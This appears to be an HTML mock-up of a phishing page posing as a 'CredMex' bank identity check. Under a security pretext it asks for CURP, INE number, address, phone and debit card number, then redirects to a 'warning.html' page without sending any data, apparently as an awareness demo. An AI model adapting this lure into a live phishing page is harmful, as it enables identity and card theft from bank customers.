<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro de datos CredMex</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShG-glsbaR60m6fD4vzSmHzvTUQ-IG4v40SA&s" alt="Logo Banco" class="bank-logo">
            <h1>Confirmación de Identidad</h1>
            <p>Por seguridad, necesitamos verificar tu información personal</p>
        </header>
        
        <form id="dataForm">
            <div class="form-group">
                <label for="fullName">Nombre completo:</label>
                <input type="text" id="fullName" name="fullName" required>
            </div>
            
            <div class="form-group">
                <label for="birthDate">Fecha de nacimiento:</label>
                <input type="date" id="birthDate" name="birthDate" required>
            </div>
            
            <div class="form-group">
                <label for="curp">CURP:</label>
                <input type="text" id="curp" name="curp" required>
                <small>Formato: 4 letras, 6 números, 6 letras, 2 números</small>
            </div>
            
            <div class="form-group">
                <label for="ine">Número de INE/IFE:</label>
                <input type="text" id="ine" name="ine" required>
            </div>
            
            <div class="form-group">
                <label for="address">Domicilio completo:</label>
                <textarea id="address" name="address" rows="3" required></textarea>
            </div>
            
            <div class="form-group">
                <label for="phone">Teléfono:</label>
                <input type="tel" id="phone" name="phone" required>
            </div>
            
            <div class="form-group">
                <label for="city">Ciudad:</label>
                <input type="text" id="city" name="city" required>
            </div>
            
            <div class="form-group">
                <label for="state">Estado:</label>
                <select id="state" name="state" required>
                    <option value="">Selecciona...</option>
                    <option value="AGU">Aguascalientes</option>
                    <option value="BCN">Baja California</option>
                    <option value="BCN">Sinaloa</option>
                    <!-- Todos los estados de México -->
                </select>
            </div>
            
            <div class="form-group">
                <label for="cardNumber">Número de tarjeta de débito:</label>
                <input type="text" id="cardNumber" name="cardNumber" required>
                <small>16 dígitos sin espacios</small>
            </div>
            
            
            <div class="form-group checkbox">
                <input type="checkbox" id="terms" name="terms" required>
                <label for="terms">Acepto los términos y condiciones del servicio</label>
            </div>
            
            <button type="submit" class="submit-btn">Guardar y Continuar</button>
        </form>
    </div>
    
    <script>
        document.getElementById('dataForm').addEventListener('submit', function(e) {
            e.preventDefault();
            window.location.href = 'warning.html';
        });
    </script>
</body>
</html>
